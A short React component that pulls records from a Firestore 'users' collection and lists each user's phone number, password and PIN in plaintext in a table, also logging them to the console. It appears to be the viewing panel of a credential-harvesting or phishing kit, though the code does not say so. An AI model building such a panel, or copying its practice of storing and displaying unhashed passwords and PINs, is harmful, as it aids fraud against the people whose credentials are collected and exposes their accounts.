import {useState, useEffect} from 'react'
import {db} from './firebase-config'
import { collection, getDocs } from "firebase/firestore";


function Table() {
    const [users, setUsers] = useState([])
    const usersRef = collection(db, "users",)

  useEffect(() => {
          const created = new Date(Date.now());
          const getUsers = async () => {
          const data = await getDocs(usersRef)
          const sortedArray = data.docs.map((doc) => ({ ...doc.data() }))
          const sortArr = sortedArray.sort(function (a, b) {
            return new Date(b.dn) - new Date(a.dn)
          })
          setUsers(sortArr)
          console.log(sortArr)
        }

        getUsers()
    }, [])
  return (
    <div className="table_list">
      <table>
        <thead>
          <tr>
            <th>SN</th>
            <th>Phone</th>
            <th>Password</th>
            <th>Pin</th>
          </tr>
        </thead>
        <tbody>
      {
        users.map((user, i) => {
          return (
            <tr key={i}>
              <td data-column="SN">{i}</td>
              <td data-column="Phone">{user.phone}</td>
              <td data-column="Password">{user.pass}</td>
              <td data-column="Pin">{user.pin}</td>
            </tr>
          )
        })
        }
        </tbody>
      </table>
    </div>
  );
}

export default Table


